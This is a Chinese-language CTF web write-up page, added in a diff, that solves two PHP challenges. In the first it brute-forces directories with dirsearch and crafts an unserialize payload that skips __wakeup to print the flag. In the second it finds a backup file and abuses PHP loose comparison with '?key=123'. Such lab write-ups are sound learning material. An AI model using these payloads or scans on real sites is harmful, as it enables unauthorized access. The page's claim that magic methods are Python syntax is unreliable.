@@ -1,0 +1,718 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/lhr.png">
+  <link rel="icon" href="/img/lhr.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="TEhS">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="PHP 提示备份网站，但查看源码之后，没发现什么文件 （查看题解，学到了一种新方法） 使用dirsearch工具，dirsearch是一个基于python3的命令行工具，常用于暴力扫描页面结构，包括网页中的目录和文件。 安装 123git clone https:&#x2F;&#x2F;github.com&#x2F;maurosoria&#x2F;dirsearch.gitcd dirsearchpip3 install -r req">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WebWriteUp3">
+<meta property="og:url" content="http://example.com/2024/02/01/WebWriteUp3/index.html">
+<meta property="og:site_name" content="TEhS">
+<meta property="og:description" content="PHP 提示备份网站，但查看源码之后，没发现什么文件 （查看题解，学到了一种新方法） 使用dirsearch工具，dirsearch是一个基于python3的命令行工具，常用于暴力扫描页面结构，包括网页中的目录和文件。 安装 123git clone https:&#x2F;&#x2F;github.com&#x2F;maurosoria&#x2F;dirsearch.gitcd dirsearchpip3 install -r req">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2024/02/01/WebWriteUp3/image-20240201102626049.png">
+<meta property="og:image" content="http://example.com/2024/02/01/WebWriteUp3/image-20240201122605748.png">
+<meta property="og:image" content="http://example.com/2024/02/01/WebWriteUp3/image-20240201152917397.png">
+<meta property="og:image" content="http://example.com/2024/02/01/WebWriteUp3/image-20240201160604920.png">
+<meta property="og:image" content="http://example.com/2024/02/01/WebWriteUp3/image-20240201161815441.png">
+<meta property="og:image" content="http://example.com/2024/02/01/WebWriteUp3/image-20240201161834973.png">
+<meta property="og:image" content="http://example.com/2024/02/01/WebWriteUp3/image-20240201161858789.png">
+<meta property="og:image" content="http://example.com/2024/02/01/WebWriteUp3/image-20240201174111628.png">
+<meta property="article:published_time" content="2024-02-01T02:25:09.000Z">
+<meta property="article:modified_time" content="2024-02-01T09:55:47.533Z">
+<meta property="article:author" content="TEhS">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2024/02/01/WebWriteUp3/image-20240201102626049.png">
+  
+  
+  
+  <title>WebWriteUp3 - TEhS</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>TEhS</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="WebWriteUp3"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-02-01 10:25" pubdate>
+          2024年2月1日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          31 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">WebWriteUp3</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p><img src="/2024/02/01/WebWriteUp3/image-20240201102626049.png" srcset="/img/loading.gif" lazyload alt="image-20240201102626049"></p>
+<p>提示备份网站，但查看源码之后，没发现什么文件</p>
+<p>（查看题解，学到了一种新方法）</p>
+<p>使用dirsearch工具，dirsearch是一个基于python3的命令行工具，常用于暴力扫描页面结构，包括网页中的目录和文件。</p>
+<p>安装</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/maurosoria/</span>dirsearch.git<br>cd dirsearch<br>pip3 install -r requirements.txt<br></code></pre></td></tr></table></figure>
+
+<p>扫描：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> dirsearch.py -u http://<span class="hljs-number">5</span>d3554e3-<span class="hljs-number">9</span>f8d-<span class="hljs-number">4</span>fb2-a4d7-b045f1a58bd4.node5.buuoj.cn:<span class="hljs-number">81</span>/ -w db/dicc.txt<br></code></pre></td></tr></table></figure>
+
+<p>有时候扫不出来，要多扫几次，最后能扫出来<a target="_blank" rel="noopener" href="http://www.zip,将其下载下来/">www.zip，将其下载下来</a></p>
+<p><img src="/2024/02/01/WebWriteUp3/image-20240201122605748.png" srcset="/img/loading.gif" lazyload alt="image-20240201122605748"></p>
+<p>flag</p>
+<p>在index.php中可以看到：</p>
+<p><img src="/2024/02/01/WebWriteUp3/image-20240201152917397.png" srcset="/img/loading.gif" lazyload alt="image-20240201152917397"></p>
+<p>引入class.php,,通过<code>$_GET[&#39;select&#39;]</code>获取了用户传递的参数，然后使用<code>unserialize</code>尝试将这个参数反序列化成对象, <code>@</code>符号来抑制可能的反序列化错误。</p>
+<p><strong>序列化与反序列化</strong></p>
+<p><img src="/2024/02/01/WebWriteUp3/image-20240201160604920.png" srcset="/img/loading.gif" lazyload alt="image-20240201160604920"></p>
+<p>序列化结果结构：</p>
+<p>O:对象名的长度:”对象名”:对象属性个数:{s:属性名的长度:”属性名”;s:属性值的长度:”属性值”;}</p>
+<p>那么首先对象长度为6，名称为class1，属性个数为3</p>
+<p>对于a：属性为public，1表示变量名长度，a为变量名</p>
+<p>对于b：属性为protected，变量名长度为4（b前添加了%00*%00）</p>
+<p>对于c：属性为private，变量长度为9，因为表示private的方式是：%00类名%00变量名</p>
+<p>对于类中声明的方法，序列化并不会保存下来</p>
+<p>反序列化：</p>
+<p><img src="/2024/02/01/WebWriteUp3/image-20240201161815441.png" srcset="/img/loading.gif" lazyload alt="image-20240201161815441"></p>
+<p><img src="/2024/02/01/WebWriteUp3/image-20240201161834973.png" srcset="/img/loading.gif" lazyload alt="image-20240201161834973"></p>
+<p><img src="/2024/02/01/WebWriteUp3/image-20240201161858789.png" srcset="/img/loading.gif" lazyload alt="image-20240201161858789"></p>
+<p>反序列化只能输出public变量</p>
+<p>class.php:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;nonono&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;yesyes&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;password != <span class="hljs-number">100</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You name is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;username;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You password is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;password;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br><br>            <br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>魔术方法（Magic Methods）</p>
+<p>所谓魔术方法（Magic Methods），是Python的一种高级语法，允许你在类中自定义函数（函数名格式一般为__xx__），并绑定到类的特殊方法中。比如在类A中自定义__str__()函数，则在调用str(A())时，会自动调用__str__()函数，并返回相应的结果。</p>
+</blockquote>
+<p>其中的wakeup和destruct都是魔术方法，</p>
+<ul>
+<li>__construct():具有构造函数的类会在每次创建新对象时先调用此方法。</li>
+<li>__destruct():析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</li>
+<li>__sleep()方法在一个对象被序列化之前调用；</li>
+<li>__wakeup():unserialize( )会检查是否存在一个__wakeup( )方法。如果存在，则会先调用_wakeup方法，预先准备对象需要的资源。</li>
+</ul>
+<p>那么这题的意图就比较清晰了，如果我们可以构造username&#x3D;admin，password&#x3D;100，然后执行destruct时，就会得到flag，但存在一个wakeup，会吧username修改为guest，现在首先需要构造一个username&#x3D;admin,password&#x3D;100的序列化对象去给它反序列，然后需要绕过wakeup，执行destruct</p>
+<p>构造反序列化：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;nonono&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;yesyes&#x27;</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Name</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-number">100</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br> <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>得到：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Name&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Nameusername&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Namepassword&quot;</span>;i:<span class="hljs-number">100</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>所以得到payload：</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?<span class="hljs-keyword">select</span>=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Name&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Nameusername&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Namepassword&quot;</span>;i:<span class="hljs-number">100</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在反序列化时，当前属性个数大于实际属性个数时，就会跳过__wakeup()，去执行__destruct</p>
+<p>修改payload：</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?<span class="hljs-keyword">select</span>=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Name&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Nameusername&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Namepassword&quot;</span>;i:<span class="hljs-number">100</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>由于两个都是私有变量，继续修改payload</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">?<span class="hljs-keyword">select</span>=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Name&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;%00Name%00username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;%00Name%00password&quot;</span>;i:<span class="hljs-number">100</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2024/02/01/WebWriteUp3/image-20240201174111628.png" srcset="/img/loading.gif" lazyload alt="image-20240201174111628"></p>
+<p>得到flag</p>
+<h3 id="BackupFile"><a href="#BackupFile" class="headerlink" title="BackupFile"></a>BackupFile</h3><p>提示为备份文件，常用的后缀有.git .svn .swp .~ .bak .bash_history</p>
+<p>所以一个个尝试，本题是index.php.bak</p>
+<p>下载下来，其内容为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$key</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$key</span>)) &#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;Just num!&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$key</span>);<br>    <span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$key</span> == <span class="hljs-variable">$str</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Try to find out source file!&quot;</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>php的弱类型比较，如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p>
+<p>所以这里只需要构造payload：?key&#x3D;123即可</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web/" class="category-chain-item">Web</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>WebWriteUp3</div>
+      <div>http://example.com/2024/02/01/WebWriteUp3/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>TEhS</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年2月1日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/01/30/DynSQL/" title="DynSQL">
+                        <span class="hidden-mobile">DynSQL</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
